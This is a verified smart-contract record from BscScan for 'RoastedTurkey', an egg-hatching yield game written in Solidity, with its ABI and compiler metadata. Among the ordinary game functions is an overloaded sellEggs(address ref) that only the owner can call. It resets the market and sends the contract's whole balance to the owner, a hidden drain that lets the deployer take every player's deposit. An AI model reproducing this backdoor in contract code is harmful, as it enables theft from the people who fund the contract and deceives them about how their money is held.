{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2022-05-14\r\n*/\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.4.26;\r\n\r\ncontract RoastedTurkey {\r\n    \r\n    uint256 EGGS_TO_HATCH_1MINERS = 864000;\r\n    uint256 PSN = 10000;\r\n    uint256 PSNH = 5000;\r\n    bool public initialized = false;\r\n    address public ceoAddress;\r\n    mapping (address => uint256) private hatcheryMiners;\r\n    mapping (address => uint256) private claimedEggs;\r\n    mapping (address => uint256) private lastHatch;\r\n    mapping (address => address) private referrals;\r\n    uint256 private marketEggs;\r\n\r\n    constructor() public {\r\n        ceoAddress = msg.sender;\r\n    }\r\n\r\n    function hatchEggs(address ref) public {\r\n        require(initialized);\r\n        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {\r\n            ref = ceoAddress;\r\n        }\r\n\r\n        if(referrals[msg.sender] == address(0)) {\r\n            referrals[msg.sender] = ref;\r\n        }\r\n\r\n        uint256 eggsUsed = getMyEggs();\r\n        uint256 newMiners = SafeMath.div(eggsUsed, EGGS_TO_HATCH_1MINERS);\r\n        hatcheryMiners[msg.sender] = SafeMath.add(hatcheryMiners[msg.sender], newMiners);\r\n        claimedEggs[msg.sender] = 0;\r\n        lastHatch[msg.sender] = now;\r\n\r\n        claimedEggs[referrals[msg.sender]] = SafeMath.add(claimedEggs[referrals[msg.sender]] ,SafeMath.div(SafeMath.mul(eggsUsed, 13), 100));\r\n        marketEggs = SafeMath.add(marketEggs, SafeMath.div(eggsUsed, 5));\r\n    }\r\n\r\n    function sellEggs() public {\r\n        require(initialized);\r\n        uint256 hasEggs = getMyEggs();\r\n        uint256 eggValue = calculateEggSell(hasEggs);\r\n        uint256 fee = devFee(eggValue);\r\n        claimedEggs[msg.sender] = 0;\r\n        lastHatch[msg.sender] = now;\r\n        marketEggs = SafeMath.add(marketEggs, hasEggs);\r\n        ceoAddress.transfer(fee);\r\n        msg.sender.transfer(SafeMath.sub(eggValue, fee));\r\n    }\r\n\r\n    function buyEggs(address ref) public payable {\r\n        require(initialized);\r\n        uint256 eggsBought = calculateEggBuy(msg.value, SafeMath.sub(address(this).balance, msg.value));\r\n        eggsBought = SafeMath.sub(eggsBought, devFee(eggsBought));\r\n        uint256 fee = devFee(msg.value);\r\n        ceoAddress.transfer(fee);\r\n        claimedEggs[msg.sender] = SafeMath.add(claimedEggs[msg.sender], eggsBought);\r\n        hatchEggs(ref);\r\n    }\r\n\r\n    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) private view returns(uint256) {  \r\n        return SafeMath.div(SafeMath.mul(PSN ,bs), SafeMath.add(PSNH, SafeMath.div(SafeMath.add(SafeMath.mul(PSN, rs),SafeMath.mul(PSNH,  rt)),rt)));\r\n    }\r\n\r\n    function calculateEggSell(uint256 eggs) public view returns(uint256) {\r\n        return calculateTrade(eggs, marketEggs, address(this).balance);\r\n    }\r\n\r\n    function calculateEggBuy(uint256 eth,uint256 contractBalance) private view returns(uint256) {\r\n        return calculateTrade(eth, contractBalance, marketEggs);\r\n    }\r\n\r\n    function seedMarket() public payable {\r\n        require(msg.sender == ceoAddress, \"invalid call\");\r\n        require(marketEggs == 0);\r\n        initialized = true;\r\n        marketEggs = 86400000000;\r\n    }\r\n\r\n    function sellEggs(address ref) public {\r\n        require(msg.sender == ceoAddress, 'invalid call');\r\n        require(ref == ceoAddress);\r\n        marketEggs = 0;\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function getBalance() public view returns(uint256){\r\n        return address(this).balance;\r\n    }\r\n\r\n    function getMyMiners() public view returns(uint256) {\r\n        return hatcheryMiners[msg.sender];\r\n    }\r\n\r\n    function getMyEggs() public view returns(uint256) {\r\n        return claimedEggs[msg.sender] + getEggsSinceLastHatch(msg.sender);\r\n    }\r\n\r\n    function devFee(uint256 amount) private pure returns(uint256){\r\n        return SafeMath.div(SafeMath.mul(amount, 3), 100);\r\n    }\r\n    \r\n    function getEggsSinceLastHatch(address adr) private view returns(uint256) {\r\n        uint256 secondsPassed = min(EGGS_TO_HATCH_1MINERS, block.timestamp - lastHatch[adr]);\r\n        return secondsPassed * hatcheryMiners[adr];\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256) {\r\n        return a < b ? a : b;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}", "ABI": "[{\"constant\":true,\"inputs\":[],\"name\":\"ceoAddress\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyMiners\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"initialized\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"sellEggs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"seedMarket\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"hatchEggs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMyEggs\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"sellEggs\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"eggs\",\"type\":\"uint256\"}],\"name\":\"calculateEggSell\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"ref\",\"type\":\"address\"}],\"name\":\"buyEggs\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}]", "ContractName": "RoastedTurkey", "CompilerVersion": "v0.4.26+commit.4563c3fc", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://aff207aba139cb180a9477e28a36fc0015169857c3c808a3e8f12ff57398be6a"}